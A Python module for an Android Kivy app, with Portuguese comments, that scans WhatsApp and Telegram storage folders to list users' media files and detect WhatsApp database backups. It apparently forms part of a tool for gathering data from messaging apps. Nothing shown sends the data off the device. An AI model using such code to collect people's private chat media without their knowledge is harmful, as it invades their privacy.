from kivy.utils import platform
import os

if platform == 'android':
    def get_whatsapp_data():
        """Tenta coletar dados do WhatsApp (LIMITADO)"""
        try:
            # Caminhos possíveis do WhatsApp
            whatsapp_paths = [
                '/storage/emulated/0/WhatsApp/',
                '/storage/emulated/0/Android/media/com.whatsapp/',
                '/sdcard/WhatsApp/'
            ]
            
            data = {
                'media_found': [],
                'backup_found': False,
                'databases_found': []
            }
            
            for path in whatsapp_paths:
                if os.path.exists(path):
                    # Procurar por mídias públicas
                    media_path = os.path.join(path, 'Media')
                    if os.path.exists(media_path):
                        try:
                            for root, dirs, files in os.walk(media_path):
                                for file in files[:10]:  # Limitar a 10
                                    if file.lower().endswith(('.jpg', '.png', '.mp4', '.mp3')):
                                        data['media_found'].append({
                                            'path': os.path.join(root, file),
                                            'name': file,
                                            'type': 'whatsapp_media'
                                        })
                        except:
                            pass
                    
                    # Verificar backups (geralmente protegidos)
                    backup_path = os.path.join(path, 'Databases')
                    if os.path.exists(backup_path):
                        data['backup_found'] = True
            
            return data
            
        except Exception as e:
            print(f"Erro ao acessar WhatsApp: {e}")
            return {'error': str(e)}
    
    def get_telegram_data():
        """Tenta coletar dados do Telegram (LIMITADO)"""
        try:
            telegram_paths = [
                '/storage/emulated/0/Telegram/',
                '/storage/emulated/0/Android/data/org.telegram.messenger/'
            ]
            
            data = {'media_found': []}
            
            for path in telegram_paths:
                if os.path.exists(path):
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files[:5]:
                                if file.lower().endswith(('.jpg', '.png', '.mp4')):
                                    data['media_found'].append({
                                        'path': os.path.join(root, file),
                                        'name': file,
                                        'type': 'telegram_media'
                                    })
                    except:
                        pass
            
            return data
            
        except Exception as e:
            return {'error': str(e)}

else:
    def get_whatsapp_data():
        return {'error': 'Não é Android'}
    
    def get_telegram_data():
        return {'error': 'Não é Android'}